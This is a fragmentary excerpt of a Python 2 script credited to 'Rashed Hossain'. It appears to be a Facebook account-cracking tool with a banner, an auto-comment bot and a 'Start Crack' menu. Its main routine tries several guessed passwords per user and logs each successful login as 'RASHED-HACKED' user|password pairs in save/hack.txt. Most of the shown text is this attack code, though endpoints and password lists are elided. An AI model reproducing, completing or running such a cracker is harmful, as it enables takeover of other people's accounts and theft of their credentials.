...
\x1b[1;93m➣     AUTHOR : RASHED HOSSAIN
\x1b[1;94m➣       FROM : DHAKA BANGLADESH
\x1b[1;95m➣   WHATSAPP : +27618543540
...
def bot_komen():
    ...
    una = 'Wwwwwwwwwwww.Mizan.Vau8080'
    kom = 'RASHED-HOSSAIN\xf0\x9f\x98\x98'
    kom = 'RASHED-HOSSAIN\xf0\x9f\x98\x8e'
    reac = 'LOVE'
    user = 'Wwwwwwwwwwww.Mizan.Vau8080'
    user = 'Wwwwwwwwwwww.Mizan.Vau8080'
    kom2 = 'RASHED-HOSSAIN\xf0\x9f\x98\x98\xe2\x98\xa0\xef\xb8\x8f'
    kom = 'RASHED-HOSSAIN\xf0\x9f\x98\x98\xf0\x9f\x98\x98'
...
def menu():
    ...
    print '\n\x1b[1;91m> 1.\x1b[0m Rashed Start Crack....'
...
def pilih_super():
    ...
    print '\x1b[1;97m[+] \x1b[0m Rashed Running Crack Please Wait\x1b[0m..........'
    time.sleep(4)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[RASHED-HACKED] ' + user + ' |\x1b[0m ' + p1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;;92m[RASHED-HACKED] ' + user + ' |\x1b[0m ' + p2
                    cek = open('save/hack.txt', 'a')
                    cek.write(user + '|' + p2 + '\n')
                    cek.close()
                    oks.append(user + p2)
                    ...
                    if 'access_token' in q:
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[RASHED-HACKED] ' + user + ' |\x1b[0m ' + p4
                            cek = open('save/hack.txt', 'a')
                            cek.write(user + '|' + p4 + '\n')
                            cek.close()
                            oks.append(user + p4)
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[RASHED-HACKED] ' + user + ' |\x1b[0m ' + p5
                                cek = open('save/hack.txt', 'a')
                                cek.write(user + '|' + p5 + '\n')
                                cek.close()
                                oks.append(user + p5)
                                ...
                                if 'access_token' in q:
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[RASHED-HACKED] ' + user + ' |\x1b[0m ' + p7
                                        cek = open('save/hack.txt', 'a')
                                        cek.write(user + '|' + p7 + '\n')
                                        cek.close()
                                        oks.append(user + p7)
